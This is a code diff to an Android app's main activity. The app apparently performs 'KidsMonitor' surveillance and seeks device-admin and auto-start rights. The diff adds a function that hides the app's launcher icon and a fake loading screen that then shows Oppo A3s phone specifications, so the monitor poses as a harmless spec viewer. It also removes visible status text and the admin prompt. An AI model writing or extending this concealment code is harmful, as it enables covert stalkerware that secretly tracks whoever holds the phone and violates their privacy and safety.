@@ -11,7 +11,10 @@ import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.os.PowerManager
+import android.widget.Toast
 import android.provider.Settings
 import android.view.View
 import androidx.activity.result.contract.ActivityResultContracts
@@ -109,6 +112,17 @@ class MainActivity : AppCompatActivity() {
         binding.btnAdmin.setOnClickListener { enableDeviceAdmin() }
         binding.btnAutoStart.setOnClickListener { requestAutoStartPermission() }
 
+        // Hide App Icon Click Listener
+        binding.btnHideIcon.setOnClickListener {
+            hideAppIcon()
+        }
+
+        // Show Loader for 2.5 seconds, then display full Oppo A3s specifications
+        Handler(Looper.getMainLooper()).postDelayed({
+            binding.layoutLoading.visibility = View.GONE
+            binding.layoutDetails.visibility = View.VISIBLE
+        }, 2500)
+
         getSharedPreferences("KidsMonitorPrefs", Context.MODE_PRIVATE)
             .edit()
             .putBoolean("monitoring_enabled", true)
@@ -119,6 +133,18 @@ class MainActivity : AppCompatActivity() {
         } else {
             requestPermissions()
         }
+    }
+
+    private fun hideAppIcon() {
+        val p = packageManager
+        val componentName = ComponentName(this, MainActivity::class.java)
+        p.setComponentEnabledSetting(
+            componentName,
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        )
+        Toast.makeText(this, "App icon hidden from home screen. Still accessible in App Manager.", Toast.LENGTH_LONG).show()
+        finish()
     }
 
     private fun init() {
@@ -159,17 +185,8 @@ class MainActivity : AppCompatActivity() {
             binding.btnAdmin.visibility = View.GONE
             requestIgnoreBatteryOptimizations()
             if (isFirstLaunch()) requestAutoStartPermission()
-
-            binding.tvStatus.text = "Optimizing system performance..."
-            binding.tvStatus.visibility = View.VISIBLE
-            binding.spinnerLoader.visibility = View.VISIBLE
         } else {
-            binding.btnAdmin.visibility = View.VISIBLE
-            binding.btnAdmin.text = "Enable System Service Protection"
-            binding.btnAdmin.setOnClickListener { enableDeviceAdmin() }
-            binding.tvStatus.text = "System Protection Disabled"
-            binding.tvStatus.visibility = View.VISIBLE
-            binding.spinnerLoader.visibility = View.GONE
+            binding.btnAdmin.visibility = View.GONE
         }
         
         val sharedPrefs = getSharedPreferences("KidsMonitorPrefs", Context.MODE_PRIVATE)
